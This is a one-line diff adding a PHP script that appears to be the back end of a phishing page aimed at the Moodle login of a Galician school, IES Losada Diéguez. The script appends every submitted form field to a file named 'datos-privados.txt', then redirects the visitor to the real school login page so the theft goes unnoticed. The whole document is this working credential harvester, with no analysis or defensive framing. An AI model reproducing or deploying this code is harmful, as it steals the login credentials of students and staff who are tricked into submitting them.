@@ -1,0 +1,1 @@
+<?php $file = 'datos-privados.txt'; file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://www.edu.xunta.gal/centros/ieslosadadieguez/aulavirtual/login/index.php" />
